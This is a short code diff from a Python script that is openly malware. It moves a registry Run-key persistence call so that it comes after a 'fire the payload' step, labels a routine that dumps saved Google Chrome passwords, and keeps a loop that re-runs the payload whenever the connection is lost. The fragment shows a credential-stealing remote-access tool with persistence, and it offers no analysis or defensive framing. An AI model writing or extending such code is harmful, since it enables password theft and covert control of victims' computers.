@@ -111,13 +111,16 @@ def dump_google_password():
                         pass
             passGoogle.close()
 
-# set the reg value in run key
-set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)
 
 # fire the payload
 fire()
 time.sleep(5)
+# set the reg value in run key
+set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)
+
+# dump google chrome password
 dump_google_password()
+
 # keep firing in case of the connection is loss
 while True:
     run_after_close()
